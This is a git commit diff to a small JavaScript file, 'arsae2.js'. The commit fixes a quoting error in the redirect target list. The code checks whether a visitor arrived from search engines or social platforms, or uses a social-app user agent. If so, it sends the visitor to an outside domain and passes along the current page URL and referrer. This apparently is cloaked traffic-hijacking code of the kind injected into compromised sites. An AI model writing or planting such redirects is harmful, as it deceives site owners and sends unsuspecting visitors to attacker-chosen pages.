5da7de1e01c3ba44faa9b0043e5b0b58510c4b8f
santirozalia <108447198+santirozalia@users.noreply.github.com>
2023-07-01 15:00:11 +0700

    Update arsae2.js

--- arsae2.js
+++ arsae2.js
@@ -3,9 +3,9 @@
     {
     	var cek = document.referrer;
 
-    	var ars 	= rChoice([
-							
-							 'https://kasef.co.uk/,
+    	var ars 	= rChoice([	
+		 					'https://kasef.co.uk/', 
+							           
 		
 							]);
 
@@ -17,4 +17,3 @@
 	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'yahoo.', 'whatsapp.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
 //]]>
-
